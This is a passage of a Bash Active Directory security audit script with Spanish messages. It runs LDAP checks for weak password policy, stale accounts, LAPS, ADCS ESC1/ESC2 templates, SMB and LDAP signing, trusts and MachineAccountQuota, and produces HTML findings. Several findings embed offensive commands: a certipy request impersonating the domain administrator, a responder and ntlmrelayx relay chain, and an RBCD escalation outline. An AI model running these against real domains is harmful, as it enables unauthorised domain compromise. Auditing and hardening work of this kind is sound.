dt = datetime.datetime.utcnow() - datetime.timedelta(days=90)
# Windows FileTime
ft = int(dt.timestamp()) * 10000000 + 116444736000000000
print(ft)
" 2>/dev/null || echo "0")

    if (( ninety_days_ago > 0 )); then
        inactive_data=$(_ldap "(&(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2))(lastLogonTimestamp<=${ninety_days_ago})(lastLogonTimestamp>=1))" \
            "cn sAMAccountName lastLogonTimestamp" 2>/dev/null)
        local inactive_count
        inactive_count=$(echo "$inactive_data" | grep -c "^dn:" || echo 0)

        if (( inactive_count > 0 )); then
            _ad_warn "${inactive_count} cuentas activas sin logon en 90+ días"
            _ad_finding "MEDIO" "Cuentas Inactivas Activas — ${inactive_count} Usuarios" \
                "<p><b>${inactive_count} cuentas habilitadas</b> sin inicio de sesión en más de 90 días. Son vectores de ataque ideales: nadie notará el uso.</p>
                <p>Exportado en: <code>${AD_OUT_DIR}/inactive_accounts.txt</code></p>" \
                "5.0" \
                "Deshabilitar cuentas inactivas >90 días. Implementar proceso de revisión de identidades trimestral (IAM lifecycle)." \
                "Search-ADAccount -AccountInactive -TimeSpan 90.00:00:00 -UsersOnly | Disable-ADAccount"
            echo "$inactive_data" > "${AD_OUT_DIR}/inactive_accounts.txt"
        else
            _ad_ok "Sin cuentas inactivas relevantes"
        fi
    fi

    # ════════════════════════════════════════════════════════════
    # CHECK 10: POLÍTICA DE CONTRASEÑAS DEL DOMINIO
    # ════════════════════════════════════════════════════════════
    _ad_log "[10/35] Política de contraseñas del dominio"
    local pso_data
    pso_data=$(_ldap "(objectClass=domainDNS)" \
        "minPwdLength maxPwdAge minPwdAge lockoutThreshold pwdProperties" 2>/dev/null)

    local min_len lockout_threshold pwd_props max_age
    min_len=$(echo "$pso_data" | grep "^minPwdLength:" | awk '{print $2}' | tr -d '[:space:]')
    lockout_threshold=$(echo "$pso_data" | grep "^lockoutThreshold:" | awk '{print $2}' | tr -d '[:space:]')
    pwd_props=$(echo "$pso_data" | grep "^pwdProperties:" | awk '{print $2}' | tr -d '[:space:]')
    max_age=$(echo "$pso_data" | grep "^maxPwdAge:" | awk '{print $2}' | tr -d '[:space:]')

    local pwd_issues=()
    (( ${min_len:-0} < 12 )) && pwd_issues+=("Longitud mínima = ${min_len:-?} (recomendado ≥ 12)")
    [[ "${lockout_threshold:-0}" == "0" ]] && pwd_issues+=("Sin bloqueo por intentos fallidos (lockoutThreshold=0) → permite fuerza bruta")
    (( ${lockout_threshold:-10} > 10 )) && pwd_issues+=("Bloqueo configurado en ${lockout_threshold} intentos (recomendado ≤ 5)")

    local pwd_html="<table class='vuln-table'>"
    pwd_html+="<tr><th>Parámetro</th><th>Valor</th><th>Estado</th></tr>"
    pwd_html+="<tr><td>Longitud mínima</td><td>${min_len:-?}</td><td>$(( ${min_len:-0} >= 12 )) && echo '✅' || echo '⚠'</td></tr>"
    pwd_html+="<tr><td>Bloqueo (intentos)</td><td>${lockout_threshold:-?}</td><td>$([[ "${lockout_threshold:-0}" == "0" ]] && echo '❌ Desactivado' || echo '✅')</td></tr>"
    pwd_html+="</table>"

    if (( ${#pwd_issues[@]} > 0 )); then
        local issue_text=""
        for issue in "${pwd_issues[@]}"; do issue_text+="<li>${issue}</li>"; done
        pwd_html+="<ul>${issue_text}</ul>"

        local pwd_sev="MEDIO"
        [[ "${lockout_threshold:-0}" == "0" ]] && pwd_sev="ALTO"

        _ad_finding "$pwd_sev" "Política de Contraseñas Débil" \
            "$pwd_html" "6.5" \
            "Configurar: minPwdLength ≥ 14, lockoutThreshold ≤ 5, lockoutDuration ≥ 30 min, pwdProperties incluir complejidad. Usar Fine-Grained Password Policies (PSO) para cuentas privilegiadas." \
            "Get-ADDefaultDomainPasswordPolicy | Fine-Grained: Get-ADFineGrainedPasswordPolicy -Filter *"
    else
        _ad_ok "Política de contraseñas: configuración aceptable"
    fi

    # ════════════════════════════════════════════════════════════
    # CHECK 11: PASS-THE-HASH — LLMNR/NBT-NS (detectar configuración)
    # CHECK 12: ADMINCOUNT=1 sin ser admin
    # ════════════════════════════════════════════════════════════
    _ad_log "[11/35] AdminCount=1 en cuentas no administradoras (SDProp abuse)"
    local admincount_data
    admincount_data=$(_ldap "(&(objectClass=user)(adminCount=1)(!(memberOf=CN=Domain Admins,CN=Users,${AD_BASE_DN}))(!(memberOf=CN=Administrators,CN=Builtin,${AD_BASE_DN})))" \
        "cn sAMAccountName" 2>/dev/null)
    local admincount_num
    admincount_num=$(echo "$admincount_data" | grep -c "^dn:" || echo 0)

    if (( admincount_num > 0 )); then
        _ad_warn "${admincount_num} cuentas con adminCount=1 sin ser admins actuales"
        local ac_html="<p><b>${admincount_num} cuentas</b> tienen adminCount=1 pero no pertenecen a grupos admin actuales. Esto indica que fueron admins anteriormente y heredaron ACLs privilegiadas que NO se limpiaron (SDProp no revirtió los permisos).</p><ul>"
        while IFS= read -r line; do
            [[ "$line" =~ ^sAMAccountName:\ (.+) ]] && ac_html+="<li><code>${BASH_REMATCH[1]}</code></li>"
        done <<< "$admincount_data"
        ac_html+="</ul>"

        _ad_finding "ALTO" "AdminCount=1 Sin Membresía Admin — ${admincount_num} Cuentas" \
            "$ac_html" "7.5" \
            "Resetear adminCount a 0 y corregir ACLs en el objeto. Limpiar ACEs huérfanas con: Get-ObjectAcl y Remove-ObjectAcl en PowerView." \
            "Get-ADUser -LDAPFilter '(adminCount=1)' | Get-ObjectAcl -ResolveGUIDs | ?{_.ActiveDirectoryRights -match 'Write'}"
    else
        _ad_ok "adminCount consistente"
    fi

    # ════════════════════════════════════════════════════════════
    # CHECK 13: PASSWORD IN DESCRIPTION
    # ════════════════════════════════════════════════════════════
    _ad_log "[12/35] Contraseñas en atributo Description"
    local pwddesc_data
    pwddesc_data=$(_ldap "(&(objectClass=user)(description=*pass*))" "cn sAMAccountName description" 2>/dev/null)
    pwddesc_data+=$'\n'
    pwddesc_data+=$(_ldap "(&(objectClass=user)(description=*pwd*))" "cn sAMAccountName description" 2>/dev/null)
    pwddesc_data+=$'\n'
    pwddesc_data+=$(_ldap "(&(objectClass=user)(description=*password*))" "cn sAMAccountName description" 2>/dev/null)

    local pwddesc_count
    pwddesc_count=$(echo "$pwddesc_data" | grep -c "^dn:" || echo 0)

    if (( pwddesc_count > 0 )); then
        _ad_crit "Posibles credenciales en campo Description: ${pwddesc_count} cuentas"
        local pwddesc_html="<p>Cuentas con palabras clave de contraseña en su descripción:</p><ul>"
        while IFS= read -r line; do
            [[ "$line" =~ ^sAMAccountName:\ (.+) ]] && local sam_tmp="${BASH_REMATCH[1]}"
            [[ "$line" =~ ^description:\ (.+) ]] && pwddesc_html+="<li><b>${sam_tmp}</b>: <code>${BASH_REMATCH[1]}</code></li>"
        done <<< "$pwddesc_data"
        pwddesc_html+="</ul>"

        _ad_finding "CRÍTICO" "Contraseñas en Descripción de Cuentas AD" \
            "$pwddesc_html" "9.0" \
            "Eliminar inmediatamente contraseñas de los campos Description. Cambiar contraseñas expuestas. Auditar todos los atributos LDAP accesibles (info, comment, wWWHomePage)." \
            "_ldap '(description=*pass*)' 'sAMAccountName description'"
    else
        _ad_ok "Sin contraseñas en Description"
    fi

    # ════════════════════════════════════════════════════════════
    # CHECK 14: DCSYNC RIGHTS (usuarios con replication permissions)
    # ════════════════════════════════════════════════════════════
    _ad_log "[13/35] DCSync — Permisos de replicación en usuarios no-DC"
    # Buscar ACEs con DS-Replication-Get-Changes en el objeto dominio
    local dcsync_check
    dcsync_check=$(python3 - << 'PYDCSYNC' 2>/dev/null
import subprocess
# Check who has Replicating Directory Changes permission via ldapsearch
# The GUID for DS-Replication-Get-Changes is 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
result = subprocess.run([
    'ldapsearch', '-x', '-LLL',
    '-H', f'ldap://${AD_DC_IP}:389',
    '-D', '${AD_USER_FULL}',
    '-w', '${AD_PASS}',
    '-b', '${AD_BASE_DN}',
    '-s', 'base',
    '(objectClass=*)', 'nTSecurityDescriptor'
], capture_output=True, text=True, timeout=15)
# If we can't parse SD, just note the limitation
if result.returncode == 0:
    print("ACCESSIBLE")
else:
    print("DENIED")
PYDCSYNC
)

    if [[ "$dcsync_check" == "ACCESSIBLE" ]]; then
        _ad_warn "Verificar permisos DCSync manualmente (requiere análisis de ACL)"
        _ad_finding "INFO" "DCSync — Verificación Manual Requerida" \
            "<p>Los permisos DCSync (DS-Replication-Get-Changes-All) deben verificarse con BloodHound o PowerView ya que requieren parseo del Security Descriptor binario.</p>
            <code>Get-ObjectAcl -DistinguishedName '${AD_BASE_DN}' -ResolveGUIDs | ?{\\$_.ObjectAceType -match 'Replication'}</code>" \
            "N/A" \
            "Solo Domain Controllers y administradores delegados deben tener permisos de replicación." \
            "bloodhound-python -u ${AD_USER} -p '${AD_PASS}' -d ${AD_DOMAIN_FQDN} -c DCOnly"
    fi

    # ════════════════════════════════════════════════════════════
    # CHECK 15: LAPS — Local Admin Password Solution
    # ════════════════════════════════════════════════════════════
    _ad_log "[14/35] LAPS — Local Administrator Password Solution"
    local laps_data
    laps_data=$(_ldap "(objectClass=computer)" "ms-Mcs-AdmPwd ms-Mcs-AdmPwdExpirationTime cn" 2>/dev/null)
    local total_computers laps_computers
    total_computers=$(echo "$laps_data" | grep -c "^dn:" || echo 0)
    laps_computers=$(echo "$laps_data" | grep -c "^ms-Mcs-AdmPwd:" || echo 0)

    local laps_readable
    laps_readable=$(echo "$laps_data" | grep "^ms-Mcs-AdmPwd:" | grep -v "^ms-Mcs-AdmPwd: $" | wc -l)

    if (( total_computers > 0 && laps_computers == 0 )); then
        _ad_crit "LAPS NO instalado en ninguno de los ${total_computers} equipos"
        _ad_finding "ALTO" "LAPS No Implementado — ${total_computers} Equipos Sin Protección" \
            "<p>LAPS (Local Administrator Password Solution) <b>no está instalado</b>. Todos los equipos probablemente comparten la misma contraseña de administrador local, lo que permite movimiento lateral masivo tras comprometer un equipo.</p>
            <p><b>Total equipos:</b> ${total_computers}</p>" \
            "8.0" \
            "Implementar LAPS o Windows LAPS (nativo en Windows Server 2022/Windows 11 22H2+). Configurar GPO para rotación automática de contraseñas." \
            "Install-Module LAPS | Get-LAPSComputers | find /v '' %windir%\\system32\\drivers\\Microsoft\\\\LocalAdministratorPasswordSolution.dll"
    elif (( laps_readable > 0 )); then
        _ad_warn "${laps_readable} contraseñas LAPS son LEGIBLES por el usuario actual"
        _ad_finding "ALTO" "Contraseñas LAPS Legibles — ${laps_readable} Equipos" \
            "<p>El usuario <b>${AD_USER}</b> puede leer contraseñas LAPS de ${laps_readable} equipos. Esto puede ser excesivo si el usuario no es admin delegado.</p>" \
            "7.5" \
            "Revisar ACLs sobre ms-Mcs-AdmPwd. Solo admins IT y cuentas de helpdesk deben poder leer LAPS passwords." \
            "Find-AdmPwdExtendedRights -Identity '${AD_BASE_DN}'"
    else
        _ad_ok "LAPS instalado y contraseñas protegidas"
    fi

    # ════════════════════════════════════════════════════════════
    # CHECK 16-19: ADCS — Active Directory Certificate Services
    # ════════════════════════════════════════════════════════════
    _ad_log "[15/35] ADCS — Certificate Templates vulnerables (ESC1-ESC8)"
    local adcs_base="CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,${AD_BASE_DN}"

    # ESC1: Template con enrollee supplies subject + clientAuth EKU
    local esc1_data
    esc1_data=$(ldapsearch -x -LLL \
        -H "ldap://${AD_DC_IP}:389" \
        -D "${AD_USER_FULL}" \
        -w "${AD_PASS}" \
        -b "${adcs_base}" \
        "(&(objectClass=pKICertificateTemplate)(msPKI-Certificate-Name-Flag:1.2.840.113556.1.4.803:=1)(msPKI-Enrollment-Flag:1.2.840.113556.1.4.803:=2))" \
        "cn msPKI-Certificate-Name-Flag msPKI-RA-Signature pKIExtendedKeyUsage" 2>/dev/null)

    local esc1_count
    esc1_count=$(echo "$esc1_data" | grep -c "^dn:" || echo 0)

    if (( esc1_count > 0 )); then
        _ad_crit "ESC1: ${esc1_count} templates ADCS vulnerables a impersonation"
        local esc1_html="<p><b>ESC1 — Enrollee Supplies Subject + Client Auth:</b> Un atacante puede solicitar un certificado con cualquier SAN (Subject Alternative Name), incluyendo Domain Admin, para autenticarse como cualquier usuario.</p>"
        esc1_html+="<ul>"
        while IFS= read -r line; do
            [[ "$line" =~ ^cn:\ (.+) ]] && {
                AD_ADCS_TEMPLATES+=("ESC1:${BASH_REMATCH[1]}")
                esc1_html+="<li>Template: <b>${BASH_REMATCH[1]}</b></li>"
            }
        done <<< "$esc1_data"
        esc1_html+="</ul>"
        esc1_html+="<p><code>certipy req -u USER@${AD_DOMAIN_FQDN} -p PASS -ca CA-NAME -template TEMPLATE -upn administrator@${AD_DOMAIN_FQDN} -dc-ip ${AD_DC_IP}</code></p>"

        _ad_finding "CRÍTICO" "ADCS ESC1 — ${esc1_count} Templates Vulnerables" \
            "$esc1_html" "9.8" \
            "Deshabilitar CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT en los templates (msPKI-Certificate-Name-Flag). Si es necesario para uso legítimo, requerir aprobación de CA (CA Manager Approval)." \
            "certipy find -u ${AD_USER}@${AD_DOMAIN_FQDN} -p '${AD_PASS}' -dc-ip ${AD_DC_IP} -vulnerable -stdout"
    else
        _ad_ok "ADCS ESC1: sin templates vulnerables"
    fi

    # ESC2 y ESC3 detection (Any Purpose EKU)
    _ad_log "[16/35] ADCS ESC2/ESC3 — Any Purpose EKU"
    local esc2_data
    esc2_data=$(ldapsearch -x -LLL \
        -H "ldap://${AD_DC_IP}:389" \
        -D "${AD_USER_FULL}" \
        -w "${AD_PASS}" \
        -b "${adcs_base}" \
        "(&(objectClass=pKICertificateTemplate)(pKIExtendedKeyUsage=2.5.29.37.0))" \
        "cn pKIExtendedKeyUsage" 2>/dev/null)
    local esc2_count
    esc2_count=$(echo "$esc2_data" | grep -c "^dn:" || echo 0)

    if (( esc2_count > 0 )); then
        _ad_crit "ESC2: ${esc2_count} templates con Any Purpose EKU"
        local esc2_html="<p><b>ESC2</b> — Templates con <b>Any Purpose EKU</b> (2.5.29.37.0). Permite usar el certificado para autenticación de cliente aunque no esté declarado explícitamente.</p>"
        while IFS= read -r line; do
            [[ "$line" =~ ^cn:\ (.+) ]] && {
                AD_ADCS_TEMPLATES+=("ESC2:${BASH_REMATCH[1]}")
                esc2_html+="<li>Template: <b>${BASH_REMATCH[1]}</b></li>"
            }
        done <<< "$esc2_data"

        _ad_finding "CRÍTICO" "ADCS ESC2 — Any Purpose EKU en ${esc2_count} Templates" \
            "$esc2_html" "9.5" \
            "Eliminar el OID 2.5.29.37.0 de pKIExtendedKeyUsage. Reemplazar con EKUs específicos necesarios." \
            "certipy find -u ${AD_USER}@${AD_DOMAIN_FQDN} -p '${AD_PASS}' -dc-ip ${AD_DC_IP} -vulnerable"
    else
        _ad_ok "ADCS ESC2: sin templates Any Purpose"
    fi

    # ════════════════════════════════════════════════════════════
    # CHECK 17: GUEST ACCOUNT HABILITADO
    # ════════════════════════════════════════════════════════════
    _ad_log "[17/35] Cuenta Guest habilitada"
    local guest_data
    guest_data=$(_ldap "(&(objectClass=user)(cn=Guest)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))" \
        "cn userAccountControl" 2>/dev/null)

    if echo "$guest_data" | grep -q "^dn:"; then
        _ad_crit "Cuenta Guest HABILITADA"
        _ad_finding "ALTO" "Cuenta Guest Habilitada en el Dominio" \
            "<p>La cuenta <b>Guest</b> está habilitada. Esta cuenta permite acceso anónimo básico y es frecuentemente usada en ataques de reconocimiento inicial.</p>" \
            "7.0" \
            "Deshabilitar la cuenta Guest: Disable-ADAccount -Identity Guest" \
            "Disable-ADAccount -Identity 'Guest' -Server ${AD_DC_IP}"
    else
        _ad_ok "Cuenta Guest deshabilitada (correcto)"
    fi

    # ════════════════════════════════════════════════════════════
    # CHECK 18: SMB SIGNING (requiere nmap si disponible)
    # ════════════════════════════════════════════════════════════
    _ad_log "[18/35] SMB Signing — Protección contra NTLM Relay"
    if command -v nmap >/dev/null 2>&1; then
        local smb_signing
        smb_signing=$(nmap -p 445 --script smb2-security-mode "${AD_DC_IP}" 2>/dev/null | \
            grep -i "message signing")

        if echo "$smb_signing" | grep -qi "required"; then
            _ad_ok "SMB Signing requerido en DC (correcto)"
        elif echo "$smb_signing" | grep -qi "enabled but not required"; then
            _ad_crit "SMB Signing habilitado pero NO requerido → NTLM Relay posible"
            _ad_finding "CRÍTICO" "SMB Signing No Requerido — NTLM Relay Attack" \
                "<p>SMB Signing está habilitado pero no es obligatorio. Esto permite ataques <b>NTLM Relay</b> (responder + ntlmrelayx) para comprometer equipos sin crackear hashes.</p>
                <p>Resultado nmap: <code>${smb_signing}</code></p>" \
                "9.0" \
                "GPO: Computer Configuration → Windows Settings → Security Settings → Local Policies → Security Options → 'Microsoft network server: Digitally sign communications (always)' = Enabled" \
                "nmap --script smb2-security-mode -p 445 ${AD_DC_IP} | responder -I eth0 -rdw + ntlmrelayx.py -smb2support -t smb://${AD_DC_IP}"
        fi
    else
        _ad_log "nmap no disponible, verificar SMB Signing manualmente"
        _ad_finding "INFO" "SMB Signing — Verificación Manual" \
            "<p>nmap no disponible. Verificar manualmente con: <code>nmap -p445 --script smb2-security-mode ${AD_DC_IP}</code></p>" \
            "N/A" "Instalar nmap para verificación automática." \
            "nmap -p 445 --script smb2-security-mode ${AD_DC_IP}"
    fi

    # ════════════════════════════════════════════════════════════
    # CHECK 19: LDAP SIGNING / CHANNEL BINDING
    # ════════════════════════════════════════════════════════════
    _ad_log "[19/35] LDAP Signing — Channel Binding"
    local ldap_no_sign
    ldap_no_sign=$(ldapsearch -x -LLL \
        -H "ldap://${AD_DC_IP}:389" \
        -D "${AD_USER_FULL}" \
        -w "${AD_PASS}" \
        -b "" \
        -s base \
        "(objectClass=*)" supportedCapabilities 2>&1)

    # Si podemos conectar sin SSL en puerto 389 con credenciales en claro → signing débil
    if echo "$ldap_no_sign" | grep -qi "supportedCapabilities\|supported"; then
        _ad_warn "LDAP en puerto 389 acepta autenticación sin signing"
        _ad_finding "MEDIO" "LDAP Signing No Enforced — Posible LDAP Relay" \
            "<p>El servidor acepta autenticación LDAP en texto claro (puerto 389) sin requerir LDAP Signing. Esto puede permitir ataques de LDAP Relay.</p>
            <p>Verificar con: <code>LdapRelayScan.py -u ${AD_USER} -p PASS -d ${AD_DC_IP}</code></p>" \
            "6.5" \
            "Configurar LDAP Signing requerido: Group Policy → Computer Configuration → Windows Settings → Security Settings → Local Policies → Security Options → 'Domain controller: LDAP server signing requirements' = Require signing" \
            "LdapRelayScan.py -method BOTH -u ${AD_USER} -p '${AD_PASS}' ${AD_DC_IP}"
    fi

    # ════════════════════════════════════════════════════════════
    # CHECK 20: USUARIOS EN GRUPO PROTEGIDO (Protected Users)
    # ════════════════════════════════════════════════════════════
    _ad_log "[20/35] Protected Users group — cuentas privilegiadas sin protección"
    local protusers_data
    protusers_data=$(_ldap "(cn=Protected Users)" "member" 2>/dev/null)
    local prot_members
    prot_members=$(echo "$protusers_data" | grep -c "^member:")

    local da_count="${#AD_DA_MEMBERS[@]}"
    if (( prot_members < da_count )); then
        _ad_warn "Solo ${prot_members} en Protected Users pero hay más admins"
        _ad_finding "MEDIO" "Cuentas Privilegiadas Fuera de Protected Users" \
            "<p>El grupo <b>Protected Users</b> tiene solo <b>${prot_members} miembros</b>. Todos los Domain Admins y cuentas de Tier-0 deberían estar aquí para prevenir Pass-the-Hash, Pass-the-Ticket, y delegación de credenciales.</p>
            <p><b>Beneficios del grupo:</b> Sin NTLM, sin DES/RC4 Kerberos, sin unconstrained delegation, Kerberos tickets TTL máximo 4h.</p>" \
            "6.0" \
            "Agregar todos los Domain Admins al grupo Protected Users. Probar antes en staging ya que rompe algunas aplicaciones legadas que usan NTLM." \
            "Add-ADGroupMember -Identity 'Protected Users' -Members (Get-ADGroupMember 'Domain Admins').SamAccountName"
    else
        _ad_ok "Protected Users group correctamente poblado"
    fi

    # ════════════════════════════════════════════════════════════
    # CHECK 21: DOMAIN TRUSTS — relaciones de confianza
    # ════════════════════════════════════════════════════════════
    _ad_log "[21/35] Domain Trusts — Relaciones de confianza"
    local trust_data
    trust_data=$(_ldap "(objectClass=trustedDomain)" \
        "cn trustDirection trustType trustAttributes flatName" 2>/dev/null)
    local trust_count
    trust_count=$(echo "$trust_data" | grep -c "^dn:" || echo 0)

    if (( trust_count > 0 )); then
        local trust_html="<p><b>${trust_count} trust(s)</b> configurados:</p><table class='vuln-table'><tr><th>Dominio</th><th>Dirección</th><th>Tipo</th><th>Atributos</th></tr>"
        local cn="" direction="" ttype="" tattrs=""
        while IFS= read -r line; do
            [[ "$line" =~ ^cn:\ (.+)  ]]              && cn="${BASH_REMATCH[1]}"
            [[ "$line" =~ ^trustDirection:\ (.+) ]]   && direction="${BASH_REMATCH[1]}"
            [[ "$line" =~ ^trustType:\ (.+) ]]         && ttype="${BASH_REMATCH[1]}"
            [[ "$line" =~ ^trustAttributes:\ (.+) ]]  && tattrs="${BASH_REMATCH[1]}"
            [[ "$line" =~ ^flatName:\ (.+) ]] && {
                # Calcular riesgo del trust
                local trust_risk="✅"
                # direction: 1=inbound, 2=outbound, 3=bidirectional
                [[ "$direction" == "3" ]] && trust_risk="⚠ Bidireccional"
                # 8 = TREAT_AS_EXTERNAL, 32 = ENABLE_TGT_DELEGATION
                (( (${tattrs:-0} & 32) > 0 )) && trust_risk="❌ TGT Delegation activo"
                trust_html+="<tr><td>${cn}</td><td>${direction} ($(( direction==3 )) && echo 'Bidireccional' || echo 'Unidireccional')</td><td>${ttype}</td><td>${tattrs} ${trust_risk}</td></tr>"
            }
        done <<< "$trust_data"
        trust_html+="</table>"

        local trust_sev="INFO"
        echo "$trust_data" | grep "trustAttributes:" | awk '{print $2}' | while read -r ta; do
            (( (${ta:-0} & 32) > 0 )) && trust_sev="ALTO" && break
        done

        _ad_finding "${trust_sev}" "Domain Trusts — ${trust_count} Relaciones Detectadas" \
            "$trust_html" "6.5" \
            "Auditar todos los trusts. Eliminar trusts innecesarios. Evitar TGT Delegation en trusts externos. Usar SID Filtering en todos los trusts externos." \
            "impacket-GetDomainTrusts ${AD_DOMAIN_FQDN}/${AD_USER}:'${AD_PASS}' -dc-ip ${AD_DC_IP}"
    else
        _ad_ok "Sin domain trusts configurados"
    fi

    # ════════════════════════════════════════════════════════════
    # CHECK 22: GPOs — Objetos de política con permisos débiles
    # ════════════════════════════════════════════════════════════
    _ad_log "[22/35] GPOs — Enumeración y permisos"
    local gpo_data
    gpo_data=$(_ldap "(objectClass=groupPolicyContainer)" \
        "cn displayName gPCFileSysPath" 2>/dev/null)
    local gpo_count
    gpo_count=$(echo "$gpo_data" | grep -c "^dn:" || echo 0)

    _ad_finding "INFO" "GPOs — ${gpo_count} Políticas Detectadas" \
        "<p>Se detectaron <b>${gpo_count} GPOs</b> en el dominio. Verificar manualmente permisos de escritura en GPOs con BloodHound o PowerView.</p>
        <p>GPOs con <i>Write</i> para usuarios no-admin = escalada a DA.</p>
        <p>Exportado en: <code>${AD_OUT_DIR}/gpos.txt</code></p>" \
        "N/A" \
        "Revisar permisos de GPOs: Get-GPPermission -All -GUID * | ?{\\$_.Permission -eq 'GpoEditDeleteModifySecurity'}" \
        "bloodhound: GPO → 'GPOs where X can modify' | PowerView: Get-GPPermission"
    echo "$gpo_data" > "${AD_OUT_DIR}/gpos.txt"

    # ════════════════════════════════════════════════════════════
    # CHECK 23: PASSWORD SPRAY PROTECTION — Fine-Grained Policies
    # ════════════════════════════════════════════════════════════
    _ad_log "[23/35] Fine-Grained Password Policies (PSO)"
    local pso_data2
    pso_data2=$(_ldap "(objectClass=msDS-PasswordSettings)" \
        "cn msDS-LockoutThreshold msDS-MinimumPasswordLength msDS-PasswordSettingsPrecedence" 2>/dev/null)
    local pso_count
    pso_count=$(echo "$pso_data2" | grep -c "^dn:" || echo 0)

    if (( pso_count == 0 )); then
        _ad_finding "BAJO" "Sin Fine-Grained Password Policies (PSO)" \
            "<p>No hay políticas de contraseñas granulares configuradas. Las cuentas privilegiadas deberían tener una PSO con requisitos más estrictos que la política de dominio por defecto.</p>" \
            "3.0" \
            "Crear PSOs para: Domain Admins (longitud ≥20, bloqueo a los 3 intentos), Service Accounts (contraseñas >25 chars, sin expiración + monitoreo de uso)." \
            "New-ADFineGrainedPasswordPolicy -Name 'AdminPSO' -Precedence 1 -MinPasswordLength 20 -LockoutThreshold 3"
    else
        _ad_ok "${pso_count} Fine-Grained Password Policies configuradas"
    fi

    # ════════════════════════════════════════════════════════════
    # CHECK 24: CUENTAS CON HISTORIAL DE CONTRASEÑAS CORTO
    # CHECK 25: DOMINIO EN MODO FUNCIONAL ANTIGUO
    # ════════════════════════════════════════════════════════════
    _ad_log "[24/35] Nivel funcional del dominio"
    local func_level_data
    func_level_data=$(_ldap "(objectClass=domainDNS)" "msDS-Behavior-Version domainFunctionality" 2>/dev/null)
    local func_level
    func_level=$(echo "$func_level_data" | grep -E "^msDS-Behavior-Version:|^domainFunctionality:" | awk '{print $2}' | head -1)

    # Niveles: 0=2000, 1=2003, 2=2003, 3=2008, 4=2008R2, 5=2012, 6=2012R2, 7=2016, 10=2025
    if (( ${func_level:-7} < 5 )); then
        _ad_warn "Nivel funcional antiguo: ${func_level} (< Windows Server 2012)"
        _ad_finding "MEDIO" "Nivel Funcional del Dominio Obsoleto (${func_level})" \
            "<p>El dominio opera en nivel funcional <b>${func_level}</b>. Los niveles bajos deshabilitan funciones de seguridad modernas como Protected Users group, Authentication Policies, y claims-based access control.</p>
            <table class='vuln-table'><tr><th>Nivel</th><th>Windows Server</th><th>Estado</th></tr>
            <tr><td>0-3</td><td>2000-2008</td><td style='color:#ff2d2d'>❌ Crítico</td></tr>
            <tr><td>4-5</td><td>2008R2-2012</td><td style='color:#ff6b35'>⚠ Obsoleto</td></tr>
            <tr><td>6-7</td><td>2012R2-2016</td><td style='color:#ffd23f'>~ Aceptable</td></tr>
            <tr><td>10</td><td>2025</td><td style='color:#3fb950'>✅ Actual</td></tr></table>" \
            "5.0" \
            "Elevar nivel funcional del dominio. Requiere que todos los DCs estén en la versión objetivo." \
            "Set-ADDomainMode -Identity ${AD_DOMAIN_FQDN} -DomainMode Windows2016Domain"
    else
        _ad_ok "Nivel funcional del dominio: ${func_level} (moderno)"
    fi

    # ════════════════════════════════════════════════════════════
    # CHECK 26: CUENTAS DE MÁQUINA (Excessive Machine Account Quota)
    # ════════════════════════════════════════════════════════════
    _ad_log "[25/35] ms-DS-MachineAccountQuota — Creación de cuentas de máquina"
    local maq_data
    maq_data=$(_ldap "(objectClass=domainDNS)" "ms-DS-MachineAccountQuota" 2>/dev/null)
    local maq_value
    maq_value=$(echo "$maq_data" | grep "^ms-DS-MachineAccountQuota:" | awk '{print $2}')

    if (( ${maq_value:-10} > 0 )); then
        _ad_warn "ms-DS-MachineAccountQuota = ${maq_value:-10} → cualquier usuario puede unir equipos al dominio"
        _ad_finding "ALTO" "MachineAccountQuota = ${maq_value:-10} — RBCD / Resource-Based Constrained Delegation" \
            "<p>El valor <b>ms-DS-MachineAccountQuota = ${maq_value:-10}</b> permite que cualquier usuario autenticado cree hasta ${maq_value:-10} cuentas de máquina en el dominio.</p>
            <p><b>Impacto:</b> En combinación con un equipo vulnerable a RBCD, permite escalada de privilegios completa sin necesidad de comprometer ninguna cuenta de servicio.</p>
            <p><b>Ataque:</b> impacket-addcomputer → impacket-rbcd → impacket-getST → Pass-the-Ticket → DA</p>" \
            "8.5" \
            "Configurar ms-DS-MachineAccountQuota = 0. Usar cuentas delegadas específicas para unir equipos al dominio." \
            "Set-ADDomain -Identity ${AD_DOMAIN_FQDN} -Replace @{'ms-DS-MachineAccountQuota'='0'}"
    else
        _ad_ok "ms-DS-MachineAccountQuota = 0 (correcto)"
    fi

    # ════════════════════════════════════════════════════════════
    # CHECK 27-28: GROUPS — Generic All / Write sobre objetos sensibles
    # ════════════════════════════════════════════════════════════
    _ad_log "[26/35] Grupos nested peligrosos"
    local nested_html="<p>Grupos que contienen otros grupos con acceso a recursos críticos:</p><ul>"
    local nested_found=false

    # Buscar grupos que sean miembros de Domain Admins (grupos dentro de grupos = escalada)
    local nested_data
    nested_data=$(_ldap "(&(objectClass=group)(memberOf=CN=Domain Admins,CN=Users,${AD_BASE_DN}))" \
        "cn distinguishedName" 2>/dev/null)

    if echo "$nested_data" | grep -q "^dn:"; then
        nested_found=true
        while IFS= read -r line; do
            [[ "$line" =~ ^cn:\ (.+) ]] && nested_html+="<li>Grupo <b>${BASH_REMATCH[1]}</b> es miembro de Domain Admins</li>"
        done <<< "$nested_data"
    fi
    nested_html+="</ul>"

    if [[ "$nested_found" == "true" ]]; then
        _ad_finding "ALTO" "Grupos Nested en Domain Admins Detectados" \
            "$nested_html" "7.5" \
            "Domain Admins no debería contener grupos, solo usuarios directos. Aplanar la membresía y eliminar grupos anidados." \
            "Get-ADGroupMember 'Domain Admins' -Recursive | ?{\\$_.objectClass -eq 'group'}"
    else
        _ad_ok "Sin grupos nested peligrosos en Domain Admins"
    fi

    # ════════════════════════════════════════════════════════════
    # CHECK 29: CUENTAS ADMINISTRATIVAS QUE USAN EMAIL CORPORATIVO
    # ════════════════════════════════════════════════════════════
    _ad_log "[27/35] Separación de cuentas admin vs cuentas de usuario"
    local da_with_email
    da_with_email=$(_ldap "(&(objectClass=user)(memberOf=CN=Domain Admins,CN=Users,${AD_BASE_DN})(mail=*))" \
        "cn sAMAccountName mail" 2>/dev/null)
    local dae_count
    dae_count=$(echo "$da_with_email" | grep -c "^dn:" || echo 0)

    if (( dae_count > 0 )); then
        _ad_warn "${dae_count} Domain Admins tienen email asociado (posible cuenta dual-use)"
